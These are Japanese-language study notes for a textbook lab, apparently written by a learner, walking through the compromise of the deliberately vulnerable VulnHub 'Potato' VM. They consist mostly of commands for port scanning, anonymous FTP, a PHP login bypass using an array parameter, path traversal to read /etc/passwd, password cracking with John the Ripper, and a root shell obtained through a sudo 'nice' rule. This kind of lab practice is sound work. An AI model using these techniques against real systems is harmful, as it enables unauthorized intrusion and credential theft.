# EXPERIMENT #01 Potato のハッキング

## [実習] ハッキングの準備(p343)

1. [ターゲット端末(Poteto)をダウンロード](https://www.vulnhub.com/entry/poteto-1,529)
2. VirtualBox に ova を import
3. 仮想ネットワークアダプタ 1 を HostOnly に設定し攻撃端末と同じネットワークを選ぶ

## [実習] Potato マシンをハッキングする＜攻略＞(p346)

### 1. Potato マシンを起動する(p346)

```sh
$ VBoxManage startvm *$VM_NAME* --type headless
```

```sh
# VM_NAMEの終了コマンド
$ VBoxManage controlvm *$VM_NAME* poweroff
```

### 2. ParrotOS マシンを起動する(p346)

### 3. ParrotOS マシンの IP アドレスを調べる(p347)

```sh
parrot01$ ip a
```

### 4. Potato マシンの IP アドレスを特定する(p347)

```sh
parrot01$ sudo netdiscover -i $INTERFACE -r 192.168.56.0/24
```

### 5. IP アドレスを環境変数に設定(p348)

```sh
parrot01$ export IP=$IP_ADDRESS
```

### 6. Potato マシンに Ping する(p348)

```sh
parrot01$ ping -c 1 $IP
```

### 7. 実験用ディレクトリの作成と移動(p348)

```sh
parrot01$ mkdir -p ~/vulnhub/potato && cd $_
```

### 8. PortScan する(p349)

```sh
parrot01$ sudo nmap -sC -sV -Pn -p- $IP -oN portscan_result.txt
```

### 9. FTP サービスにアクセスする(p350)

```sh
# curlを使った場合
$ curl -u anonymous:pass ftp://$IP:2112
$ curl -u anonymous:pass ftp://$IP:2112/index.php.bak -O
$ curl -u anonymous:pass ftp://$IP:2112/welcome.msg -O
```

```sh
# ftpクライアントを使う場合
parrot01$ sudo apt update
parrot01$ sudo apt install ftp
parrot01$ ftp $IP 2112
> Name: anonymous
> Password:適当に
ftp > ls
ftp > mget *
ftp > exit
```

### 10. ダウンロードしたファイルを調べる(p354)

```sh
parrot01$ file welcome.msg index.php.back
parrot01$ less welcome.msg
parrot01$ less index.php.back
```

### 11. HTTP サービスにアクセスする(p356)

```sh
parrot01$ curl -v http://$IP/
parrot01$ curl -v http://$IP/index.php
```

### 12. URL を環境変数に設定(p357)

```sh
parrot01$ export URL="http://$IP/"
```

### 13. アクセスできるファイルを列挙する(p357)

```sh
parrot01$ gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt

> /.hta
> /.htpasswd
> /.htaccess
> /admin
> /index.php
> /server-status
```

### 14. ソースの認証部分をみる(p359)

```sh
parrot01$ curl -v $URL/admin/

> username
> password

parrot01$ cat index.php.back | grep "$_POST"
```

### 15. Burp を使ってみる(p359)

教科書では Burp をもちいて POST ボディの書き換えを行っているが，同等のことを curl を用いておこなってみる

```sh
parrot01$ curl   -c cookie.txt $URL/admin/login.php?login=1 -X POST -d "username=admin&password[]=test"
```

### 16. 状況に応じて Burp の intercept 機能を切り替える(p363)

Burp ではページ遷移で intercept が走り，前へ進むために Forward を Ckick しなければならないが，この Intercept 機能を無効にすることができる

| ページ名 | URL                             |
| -------- | ------------------------------- |
| Home     | /admin/dashboard.php            |
| Users    | /admin/dashboard.php?page=users |
| Date     | /admin/dashboard.php?page=date  |
| Logs     | /admin/dashboard.php?page=log   |
| Ping     | /admin/dashboard.php?page=ping  |

### 17.ファイルにアクセスする Log ページを表示する(p364)

```sh
parrot01$ curl -v -b cookie.txt $URL/admin/dashboard.php
parrot01$ curl -v -b cookie.txt $URL/admin/dashboard.php?page=log

parrot01$  curl -v -b cookie.txt $URL/admin/dashboard.php?page=log -X POST -d "file=log_01.txt"

parrot01$  curl -v -b cookie.txt $URL/admin/dashboard.php?page=log -X POST -d "file=../../../../../etc/passwd"
```

### 18. 情報収集を継続する(p367)

プログラムを組んで情報を収集しても良いが，今回は変数にセットして実行してみる,`C-p`や`C-n`などを使うと過去のヒストリに移動できる。`M-b`で末尾から移動して`C-k`で削除して変更すると良いだろう

[Keybind](../docs/commands.md)

```sh
parrot01$ ROOT_DIR="../../../../.."
parrot01$ reqbody="file=$ROOT_DIR/etc/passwd"
parrot01$ !-2 # 2つ前のコマンドを実行

parrot01$ reqbody="file=$ROOT_DIR/etc/hosts"
parrot01$ !-2 # 2つ前のコマンドを実行

parrot01$ reqbody="file=$ROOT_DIR/etc/group"
parrot01$ !-2 # 2つ前のコマンドを実行

# get more info ...
```

### 19. パスワードを解析する(p370)

[john the ripper](https://openwall.com/john)

```sh
parrot01$ reqbody="file=$ROOT_DIR/etc/passwd"
parrot01$ !-2  | grep "webadmin" > hash.txt
parrot01$ john hash.txt --wordlist=/usr/share/wordlist/rockyou.txt
parrot01$ john hash.txt -show
> webadmin:dragon ...
```

### 20. SSH アクセス(p372)

```sh
parrot01$ ssh webadmin@$IP
> password dragon

webadmin@serv:~$
```

### 21. ログインに成功したら現状を把握する(p372)

```sh
webadmin@serv:~$ id
webadmin@serv:~$ pwd
```

### 22. ホームディレクトリを調べる(p373)

```sh
webadmin@serv:~$ ls -la
> user.txt
webadmin@serv:~$ cat user.txt
webadmin@serv:~$ cat user.txt | base64 -d
```

### 23. 他のユーザーのホームディレクトリにアクセスする(p373)

```sh
webadmin@serv:~$ ls /home
> florianges webadmin

webadmin@serv:~$ cd /home/florianges
webadmin@serv:/home/florianges$ ls -la
> .sudo_as_admin_successful
```

### 24. sudo の設定を確認する(p374)

```sh
webadmin@serv:/home/florianges$ sudo -l
> (ALL : ALL) /bin/nice /notes/*
```

### 25. nice コマンドのマニュアルを読む(p374)

```sh
webadmin@serv:/home/florianges$ man /bin/nice
```

### 26. "/notes" ディレクトリを調べる(p375)

```sh
webadmin@serv:/home/florianges$ cd /notes
webadmin@serv:/notes$ ls -al
> clear.sh
> id.sh
webadmin@serv:/notes$ sudo /bin/nice /notes/clear.sh
webadmin@serv:/notes$ sudo /bin/nice /notes/id.sh
```

### 27. nice コマンドを利用してルートシェルを奪取する(p376)

```sh
webadmin@serv:/notes$ sudo /bin/nice/ /notes/../bin/bash
root@serv:/notes#
```

### 28. フラグファイルを開く(p376)

```sh
root@serv:/notes# cd
root@serv:/root# ls -al
> root.txt
root@serv:/root# cat root.txt
root@serv:/root# cat root.txt | base64 -d
> licorne ...
```
